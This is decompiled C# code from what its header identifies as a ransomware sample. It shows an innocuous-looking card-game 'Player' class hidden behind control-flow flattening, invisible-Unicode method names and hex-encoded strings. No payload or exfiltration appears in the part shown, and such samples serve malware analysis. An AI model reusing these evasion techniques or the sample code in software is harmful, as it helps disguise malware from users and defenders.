// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: ModuleBuild, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 89F10113-88CA-4804-9B17-4A5288FD99D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2e269df5f1ed94bc3f07c434a6d33a1e48ce04fd0feb953bba71e2a8ced82875.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -1760067292;
      string str1;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -714714320)) % 10U)
        {
          case 0:
            num1 = (int) num2 * -1150252130 ^ -356159037;
            continue;
          case 1:
            flag = BaseStream == 1;
            num1 = -770358517;
            continue;
          case 2:
            str2 = str1;
            num1 = -2140494930;
            continue;
          case 4:
            str1 = (string) null;
            int num3 = BaseStream != 0 ? -1417133195 : (num3 = -803692738);
            num1 = num3 ^ (int) num2 * -1820098933;
            continue;
          case 5:
            str1 = "616F6658703061";
            num1 = (int) num2 * -1655534861 ^ -212544679;
            continue;
          case 6:
            num1 = (int) num2 * 1761862364 ^ 1457982126;
            continue;
          case 7:
            int num4 = flag ? -577107554 : (num4 = -1808654227);
            num1 = num4 ^ (int) num2 * -928125463;
            continue;
          case 8:
            str1 = "42696E64";
            num1 = (int) num2 * 1258023992 ^ -258251900;
            continue;
          case 9:
            goto label_1;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 737529870;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 1849360523)) % 4U)
        {
          case 0:
            num4 = 0;
            break;
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * -39033069 ^ -368484628;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 3:
            goto label_1;
          default:
            goto label_8;
        }
        num2 = num4;
        num1 = 1976274065;
      }
label_8:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 1497653465;
        int index;
        int[] planningCards;
        int num2;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 427818742)) % 14U)
          {
            case 0:
              goto label_1;
            case 1:
              num3 = planningCards[index];
              num1 = 1477698593;
              continue;
            case 2:
              int num5 = num3 > 0 ? -1007614206 : (num5 = -505342448);
              num1 = num5 ^ (int) num4 * 353033477;
              continue;
            case 3:
              num1 = (int) num4 * -764574526 ^ -270573974;
              continue;
            case 4:
              num1 = 739151447;
              continue;
            case 5:
              num1 = (int) num4 * -1649244599 ^ -945136245;
              continue;
            case 6:
              ++num2;
              num1 = (int) num4 * -859984421 ^ -1301421552;
              continue;
            case 7:
              num2 = 0;
              num1 = (int) num4 * 536614723 ^ -131865763;
              continue;
            case 8:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * -1477294961 ^ 1106573095;
              continue;
            case 9:
              planningCardsCount = num2;
              num1 = (int) num4 * 313328274 ^ -2131465683;
              continue;
            case 11:
              index = 0;
              num1 = (int) num4 * 1391874825 ^ 1058440981;
              continue;
            case 12:
              int num6;
              num1 = num6 = index < planningCards.Length ? 332955491 : (num6 = 556673637);
              continue;
            case 13:
              ++index;
              num1 = (int) num4 * -1172842085 ^ -680426643;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -1128234941;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1528455814)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -380553046 ^ 1749878813;
            continue;
          case 1:
            num1 = (int) num2 * -1750969358 ^ 1312496732;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -563855289;
      int index;
      string str1;
      int planningCard;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -336460518)) % 13U)
        {
          case 0:
            ++index;
            num1 = -995354120;
            continue;
          case 1:
            flag = index < this.PlanningCards.Length;
            num1 = -2060206821;
            continue;
          case 2:
            str2 = str1;
            num1 = (int) num2 * 635783283 ^ -480697604;
            continue;
          case 3:
            str1 = Player.\u200F‌‮⁮⁮‭‍‏‏⁮‫‪⁯‭‬‍⁬‎⁫‌⁮‍‍‎​‎‌‌‎‎⁭⁭⁮​⁬‏⁭‪‮‫‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -865432890;
            continue;
          case 5:
            num1 = (int) num2 * -1428769630 ^ 393623692;
            continue;
          case 6:
            int num3 = !flag ? -1593564987 : (num3 = -2036369593);
            num1 = num3 ^ (int) num2 * -490732368;
            continue;
          case 7:
            num1 = (int) num2 * -808008010 ^ -787176114;
            continue;
          case 8:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * 521831548 ^ 1588911365;
            continue;
          case 9:
            goto label_1;
          case 10:
            num1 = -1249060006;
            continue;
          case 11:
            num1 = (int) num2 * -1830887337 ^ 105549965;
            continue;
          case 12:
            planningCard = this.PlanningCards[index];
            int num4 = planningCard != 0 ? 1270577386 : (num4 = 107238479);
            num1 = num4 ^ (int) num2 * -1945490721;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 1698206212;
      int[] numArray;
      int[] planningCards;
      int aIndex;
      int count;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1287555661)) % 11U)
        {
          case 0:
            goto label_1;
          case 1:
            planningCards = numArray;
            num1 = (int) num2 * 640104535 ^ 5506370;
            continue;
          case 2:
            ++aIndex;
            num1 = (int) num2 * 356870614 ^ -757262435;
            continue;
          case 3:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 2107171867;
            continue;
          case 5:
            count = json.Count;
            num1 = (int) num2 * 823111039 ^ -742708151;
            continue;
          case 6:
            numArray = new int[count];
            num1 = (int) num2 * 1026375421 ^ -1100877585;
            continue;
          case 7:
            aIndex = 0;
            num1 = (int) num2 * -425953402 ^ -66201550;
            continue;
          case 8:
            num1 = (int) num2 * -1430612312 ^ -557772391;
            continue;
          case 9:
            int num3;
            num1 = num3 = aIndex >= count ? 1819665075 : (num3 = 549008981);
            continue;
          case 10:
            num1 = (int) num2 * -1661945451 ^ -1553341172;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -262064480;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1460484639)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 18453724 ^ -1196762818;
            continue;
          case 1:
            str = Player.\u206E‮‍‎‬‏⁬‎‪‮‌‌⁬‍‏‫‫‏‫‏⁭‏⁫​‫‌‌⁯‍⁭‮⁮⁫⁪‌⁮‎⁫⁯⁭‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -1744477345 ^ -283510450;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200F‌‮⁮⁮‭‍‏‏⁮‫‪⁯‭‬‍⁬‎⁫‌⁮‍‍‎​‎‌‌‎‎⁭⁭⁮​⁬‏⁭‪‮‫‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206E‮‍‎‬‏⁬‎‪‮‌‌⁬‍‏‫‫‏‫‏⁭‏⁫​‫‌‌⁯‍⁭‮⁮⁫⁪‌⁮‎⁫⁯⁭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
